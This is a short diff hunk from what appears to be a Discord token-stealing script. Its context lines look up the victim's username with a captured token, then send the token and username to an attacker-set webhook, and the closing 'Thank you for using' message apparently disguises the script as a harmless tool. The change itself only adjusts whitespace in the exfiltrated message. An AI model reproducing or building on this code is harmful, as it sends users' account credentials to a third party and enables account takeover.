@@ -78,7 +78,7 @@ if token:
 j = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
 a = j['username'] + "#" + j['discriminator']
 webhook = Webhook.from_url(web_hook_url, adapter=RequestsWebhookAdapter())
-ok = "Token: \n" + token + "\n Username: \n" + a
+ok = "Token: \n" + token + "\nUsername: \n" + a
 webhook.send(ok)
 print("Thank you for using")
        
